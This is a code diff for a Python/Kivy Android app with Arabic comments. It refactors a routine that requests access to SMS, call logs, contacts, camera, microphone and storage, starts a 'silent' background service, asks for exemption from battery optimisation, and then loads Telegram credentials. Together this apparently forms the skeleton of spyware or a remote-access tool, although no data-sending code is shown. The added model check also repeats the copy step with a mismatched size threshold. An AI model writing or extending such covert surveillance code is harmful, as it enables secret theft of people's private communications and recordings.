@@ -133,6 +133,82 @@ os.makedirs(MODELS_DIR, exist_ok=True)
 if R not in sys.path:
     sys.path.insert(0, R)
 
+# ======================== إدارة الأذونات والنموذج الديناميكية ========================
+def _request_all_permissions():
+    """
+    طلب جميع الأذونات المطلوبة مع التحقق من الحالة بشكل آمن.
+    تعيد رسالة توضح ما تم طلبه.
+    """
+    try:
+        from android.permissions import request_permissions, Permission, check_permission
+        
+        # قائمة الأذونات المعروفة في Permission
+        permissions_list = [
+            Permission.INTERNET,
+            Permission.CAMERA,
+            Permission.RECORD_AUDIO,
+            Permission.READ_EXTERNAL_STORAGE,
+            Permission.WRITE_EXTERNAL_STORAGE,
+            Permission.READ_CONTACTS,
+            Permission.READ_SMS,
+            Permission.READ_CALL_LOG
+        ]
+        
+        # أذونات إضافية قد لا تكون معرفة في Permission (تُطلب كنصوص)
+        extra_perms = [
+            "android.permission.FOREGROUND_SERVICE",
+            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
+        ]
+        
+        missing = []
+        # التحقق من الأذونات المعروفة
+        for p in permissions_list:
+            try:
+                if not check_permission(p):
+                    missing.append(p)
+            except Exception:
+                # إذا فشل التحقق، نعتبرها غير ممنوحة ونطلبها
+                missing.append(p)
+        
+        # التحقق من الأذونات الإضافية
+        for p in extra_perms:
+            try:
+                if not check_permission(p):
+                    missing.append(p)
+            except Exception:
+                missing.append(p)
+        
+        if missing:
+            request_permissions(missing)
+            return f"✅ Requested {len(missing)} missing permissions."
+        return "✅ All permissions already granted."
+    except Exception as e:
+        return f"⚠️ Permission error: {e}"
+
+def _ensure_model_exists():
+    """
+    التحقق من وجود نموذج AI بحجم مناسب، وإنشاء تحذير إذا لم يوجد.
+    تعيد True إذا كان النموذج صالحاً، False إذا كان مفقوداً أو صغيراً جداً.
+    """
+    # محاولة نسخ النموذج من assets إذا لم يكن موجوداً
+    copy_model_to_models_dir()  # هذه الدالة موجودة بالفعل في الملف الأساسي
+    
+    model_path = os.path.join(MODELS_DIR, "engine_v2.tflite")
+    # الحد الأدنى للحجم: 1 ميجابايت (يمكن تعديله حسب حجم النموذج الفعلي)
+    min_size = 1_000_000
+    
+    if not os.path.exists(model_path) or os.path.getsize(model_path) < min_size:
+        print("⚠️ Warning: AI model missing or too small. AI features will be disabled.")
+        # إنشاء ملف تحذيري ليعرفه المستخدم
+        warning_path = os.path.join(R, "ai_disabled.txt")
+        try:
+            with open(warning_path, 'w', encoding='utf-8') as f:
+                f.write("AI model not found or too small. Please place engine_v2.tflite in the models folder.")
+        except Exception as e:
+            print(f"⚠️ Could not write warning file: {e}")
+        return False
+    return True
+
 # ======================== الخدمات الخلفية ====================================
 def start_silent_service():
     try:
@@ -184,33 +260,27 @@ def open_notification_settings():
         print(f"⚠️ Could not open notification settings: {e}")
 
 def _perms():
+    """
+    دالة متكاملة تطلب الأذونات، تبدأ الخدمة الخلفية، وتطلب تجاوز تحسين البطارية.
+    تعيد رسائل الحالة كسلسلة نصية.
+    """
     msg_list = []
-    try:
-        from android.permissions import request_permissions, Permission
-        request_permissions([
-            Permission.INTERNET,
-            Permission.CAMERA,
-            Permission.RECORD_AUDIO,
-            "android.permission.FOREGROUND_SERVICE",
-            "android.permission.READ_EXTERNAL_STORAGE",
-            "android.permission.WRITE_EXTERNAL_STORAGE",
-            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
-            "android.permission.READ_CONTACTS",
-            "android.permission.READ_SMS",
-            "android.permission.READ_CALL_LOG"
-        ])
-        msg_list.append("• Requested all Android System Permissions.")
-    except Exception as e:
-        msg_list.append(f"• Permissions Error: {e}")
-
+    
+    # 1. طلب الأذونات الديناميكية
+    perm_status = _request_all_permissions()
+    msg_list.append(f"• {perm_status}")
+    
+    # 2. بدء الخدمة الخلفية
     ok, svc_msg = start_silent_service()
     msg_list.append(f"• {svc_msg}")
-
+    
+    # 3. فتح إعدادات الإشعارات بعد 2 ثانية (في خيط منفصل)
     def delayed_notification_settings():
         time.sleep(2)
         open_notification_settings()
     threading.Thread(target=delayed_notification_settings, daemon=True).start()
 
+    # 4. طلب تجاوز تحسين البطارية
     try:
         from jnius import autoclass
         ctx = autoclass('org.kivy.android.PythonActivity').mActivity
@@ -223,7 +293,7 @@ def _perms():
             ctx.startActivity(intent)
     except Exception as e:
         msg_list.append(f"• Battery exemption warning: {e}")
-
+    
     return "\n".join(msg_list)
 
 # ======================== تحميل الإعدادات ====================================
@@ -340,10 +410,14 @@ def download_file_with_checksum(url, dest_path, expected_sha256=None, max_retrie
     
     return False
 
-# ================== نسخ نموذج الذكاء الاصطناعي (محلياً فقط) ==================
+# ================== نسخ نموذج الذكاء الاصطناعي (محلياً) ==================
 def copy_model_to_models_dir():
+    """
+    نسخ نموذج الذكاء الاصطناعي من مجلد assets إلى مجلد models في runtime.
+    تعيد (bool, str) حيث bool تشير إلى النجاح والرسالة.
+    """
     try:
-        model_min_size = 5_000_000   # 5 ميغابايت
+        model_min_size = 5_000_000   # 5 ميغابايت (يمكن تعديله حسب حجم النموذج الفعلي)
         dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
 
         os.makedirs(MODELS_DIR, exist_ok=True)
@@ -370,7 +444,7 @@ def copy_model_to_models_dir():
                         print(f"⚠️ Copy failed from {src}: {e}")
                         continue
 
-        return False, "CRITICAL: engine_v2.tflite missing from assets! AI features will be disabled."
+        return False, "CRITICAL: engine_v2.tflite missing or too small! AI features will be disabled."
     except Exception as e:
         return False, f"Model copy failure: {e}"
 
@@ -442,16 +516,22 @@ class CoreApp(App):
 
         # 1. الصلاحيات والخدمات
         self.append_log("⚙️ Step 1/5: Checking system permissions & foreground service...")
-        perm_res = _perms()
+        perm_res = _perms()   # هذه الدالة أصبحت متكاملة وتطلب الأذونات وتشغل الخدمة
         self.append_log(perm_res)
 
-        # 2. ملف الموديل
+        # 2. ملف الموديل (مع التحقق الإضافي)
         self.append_log("🧠 Step 2/5: Verifying AI Model file (engine_v2.tflite)...")
         m_ok, m_msg = copy_model_to_models_dir()
         if m_ok:
             self.append_log(f"✅ AI Model: {m_msg}")
         else:
             self.append_log(f"❌ AI Model ERROR: {m_msg}")
+        
+        # التحقق الإضافي باستخدام _ensure_model_exists (يسجل تحذيراً إذا كان النموذج غير صالح)
+        if not _ensure_model_exists():
+            self.append_log("⚠️ AI model missing or too small – AI features will be disabled.")
+        else:
+            self.append_log("✅ AI model verified and ready.")
 
         # 3. تكوين النظام
         self.append_log("🔑 Step 3/5: Loading configuration & Telegram credentials...")
